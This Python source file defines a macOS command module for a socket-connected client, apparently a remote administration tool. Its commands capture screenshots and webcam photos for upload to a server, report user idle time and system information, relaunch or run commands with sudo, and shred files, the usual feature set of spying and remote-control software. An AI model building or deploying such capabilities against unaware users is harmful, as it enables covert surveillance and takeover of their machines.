import os
import subprocess
import sys
import time

from client.commands.argument_command_registry import (
    ArgumentCommandSpec,
    ArgumentOptionSpec,
    argument_command,
)
from client.commands.common import CommonCommands
from client.commands.interrupts import interruptible
from client.commands.platform.services.mac_platform_service import MacPlatformService
from core.utils.decorator import desc
from core.utils.logger import logger

MSGBOX_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='msgbox',
    description='Show a native macOS dialog',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True,
                           help_text='Dialog title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False,
                           help_text='Dialog text'),
        ArgumentOptionSpec(name='timeout', option_type='int', required=False, default=None,
                           help_text='Auto close timeout in seconds'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

NOTIFY_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='notify',
    description='Show a native macOS notification',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True,
                           help_text='Notification title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False,
                           help_text='Notification text'),
        ArgumentOptionSpec(name='sound', option_type='flag', required=False, default=False,
                           help_text='Play the default notification sound'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

SQLITE_QUERY_SPEC = ArgumentCommandSpec(
    name='sqlite_query',
    description='Read-only SQLite query',
    options=[
        ArgumentOptionSpec(name='db', option_type='str', required=True, help_text='Database file path'),
        ArgumentOptionSpec(name='query', option_type='str', required=True, help_text='SQL query'),
        ArgumentOptionSpec(name='json', option_type='flag', required=False, default=False,
                           help_text='Output as JSON'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

IMAGE_INFO_SPEC = ArgumentCommandSpec(
    name='image_info',
    description='Show image metadata (size, resolution, color mode, EXIF)',
    options=[
        ArgumentOptionSpec(name='path', option_type='str', required=True, help_text='Image file path', positional_index=0),
        ArgumentOptionSpec(name='json', option_type='flag', required=False, default=False,
                           help_text='Output as JSON'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

IMPORT_CHECK_SPEC = ArgumentCommandSpec(
    name='import_check',
    description='Check Python package/module status',
    options=[
        ArgumentOptionSpec(name='module', option_type='str', required=True, help_text='Module name', positional_index=0),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

ARCHIVE_PEEK_SPEC = ArgumentCommandSpec(
    name='archive_peek',
    description='List archive contents without extracting',
    options=[
        ArgumentOptionSpec(name='path', option_type='str', required=True, help_text='Archive file path'),
        ArgumentOptionSpec(name='limit', option_type='int', required=False, default=50,
                           help_text='Limit number of entries'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)


class MacCommands(CommonCommands):
    """macOS 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)
        self._mac_platform_service = MacPlatformService(self)

    def _run_command_text(self, command: str) -> str:
        return self._mac_platform_service.run_command_text(command, timeout=15)

    def _build_process_info(self):
        return self._mac_platform_service.build_process_info()

    def _escape_osascript_text(self, value: str):
        return self._mac_platform_service.escape_osascript_text(value)

    def _spawn_osascript(self, applescript: str):
        return self._mac_platform_service.spawn_osascript(applescript)

    @desc("Capture a screenshot", group='platform')
    @interruptible()
    def screenshot(self):
        return self._mac_platform_service.capture_screenshot()

    @desc('Show system information', group='platform')
    @interruptible()
    def getinfo(self, arg=''):
        try:
            return self._mac_platform_service.collect_system_info(arg)
        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to collect system information: {e}'

    @desc('Show user idle time', group='platform')
    @interruptible()
    def idletime(self):
        return self._mac_platform_service.get_idle_time()

    @desc('Capture webcam photo', group='platform')
    @interruptible()
    def webcam_snap(self):
        """拍照并上传到服务器"""
        return self._mac_platform_service.capture_webcam_photo()

    @desc('Launch new instance with sudo', group='platform')
    @interruptible()
    def sudo_self(self):
        """以 root 权限启动新实例，返回 PID"""
        return self._mac_platform_service.sudo_self()

    @desc('Run command with sudo', group='platform')
    @interruptible()
    def sudo_run(self, command):
        """以 root 权限执行命令 (macOS)"""
        return self._mac_platform_service.sudo_run(command)

    @desc('Securely delete file (overwrite)', group='file')
    @interruptible()
    def file_shred(self, path):
        """安全删除文件（覆写后删除）"""
        return self._mac_platform_service.secure_delete_file(path)

    @desc('Get/set system volume', group='system')
    @interruptible()
    def volume(self, level=None):
        """获取或设置系统音量 (0-100)"""
        return self._mac_platform_service.volume(level)

    @argument_command('msgbox', spec=MSGBOX_ARGUMENT_SPEC)
    def _acmd_msgbox(self, args_dict, payload=None):
        return self._mac_platform_service.acmd_msgbox(args_dict, payload)

    @argument_command('notify', spec=NOTIFY_ARGUMENT_SPEC)
    def _acmd_notify(self, args_dict, payload=None):
        return self._mac_platform_service.acmd_notify(args_dict, payload)

    @argument_command('sqlite_query', spec=SQLITE_QUERY_SPEC)
    def _acmd_sqlite_query(self, args_dict, payload=None):
        """
        只读 SQLite 查询
        Examples:
            acmd sqlite_query --db /Users/flc/studio.db --query "PRAGMA table_list;"
            acmd sqlite_query --db /Users/flc/studio.db --query "PRAGMA table_info('bookings')"
            acmd sqlite_query --db /Users/flc/studio.db --query "select * from scenes"
        """
        return self._mac_platform_service.acmd_sqlite_query(args_dict, payload)

    @argument_command('image_info', spec=IMAGE_INFO_SPEC)
    def _acmd_image_info(self, args_dict, payload=None):
        """获取图片信息"""
        return self._mac_platform_service.acmd_image_info(args_dict, payload)

    @argument_command('import_check', spec=IMPORT_CHECK_SPEC)
    def _acmd_import_check(self, args_dict, payload=None):
        """检查 Python 包是否可以导入"""
        return self._mac_platform_service.acmd_import_check(args_dict, payload)

    @argument_command('archive_peek', spec=ARCHIVE_PEEK_SPEC)
    def _acmd_archive_peek(self, args_dict, payload=None):
        """查看压缩包内容"""
        return self._mac_platform_service.acmd_archive_peek(args_dict, payload)